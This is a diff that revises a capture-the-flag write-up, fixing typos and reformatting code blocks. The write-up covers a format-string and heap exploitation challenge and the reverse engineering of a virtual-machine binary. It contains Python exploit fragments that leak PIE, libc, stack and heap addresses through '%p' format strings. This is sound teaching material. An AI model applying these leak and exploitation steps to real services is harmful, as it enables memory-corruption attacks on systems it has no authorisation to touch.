@@ -57,11 +57,13 @@ undefined8 main(void)
 To start off, we first send a series of `%p`'s in our format string to leak
 values off the stack. From this, we can recover the PIE base address, the `libc`
 base address as well as the location of the `main()` stackframe's return
-address. ```python def send_format_string(conn, payload):
-conn.sendlineafter(b"What gift do you want from santa\n>", payload) prefix =
-b"Santa brought you a " response = conn.recvline_startswith(prefix)[len(prefix)
-:] return response
-
+address. 
+```python 
+def send_format_string(conn, payload):
+    conn.sendlineafter(b"What gift do you want from santa\n>", payload) 
+    prefix = b"Santa brought you a " 
+    response = conn.recvline_startswith(prefix)[len(prefix):] 
+    return response
 
 def answer_continue(conn, to_continue):
     answer = b"y" if to_continue else b"n"
@@ -355,7 +357,7 @@ Next we create a sentinel buffer at the top of the heap to prevent top-chunk con
 create_message(conn, 0, 0x80)
 ```
 By writing into this buffer, we can also abuse the second format string vulnerability to read a heap address
-which was was left in a register from a previous operation. This allows us to determine the base address of the heap.
+which was left in a register from a previous operation. This allows us to determine the base address of the heap.
 ```python
 response = write_message(conn, 0, "%3$p")
 heap_base = int(response, 16) & ((pow(2, 64) - 1) ^ 0xFFF)
@@ -407,7 +409,7 @@ general disclaimer, the original binary is stripped of any symbols, so all names
 assigned to functions, variables, registers and instructions below are ones I
 chose myself and likely won't line up with your names.
 
-The program begins with an unusual function prologue which Ghidra has a hard time dcompiling.
+The program begins with an unusual function prologue which Ghidra has a hard time decompiling.
 Looking at the assembly we see that it repeatedly subtracts from `rsp` until a desired
 stackframe size is reached.
 ```asm
@@ -415,7 +417,7 @@ stackframe size is reached.
 001028bc     PUSH       RBP
 001028bd     MOV        RBP,RSP
 001028c0     LEA        R11=>buffer.field271_0x110,[RSP + -0x8000]
-         loop:                                            XREF[1]:     001028d7(j)  
+         loop:                                            XREF[1]:     001028d7(j)
 001028c8     SUB        RSP,0x1000
          
 001028cf     OR         qword ptr [RSP]=>buffer.field28943_0x7110,0x0
@@ -437,7 +439,7 @@ for (i = 0x1a7; i != 0; i = i + -1) {
 }
 ```
 The program then enters into its main loop, where the instruction pointer of the virtual machine is incremented continuously
-whilst instructions are read, decoded and executed.
+while instructions are read, decoded and executed.
 ```c
 void main_loop(vm_state *vm_state)
 
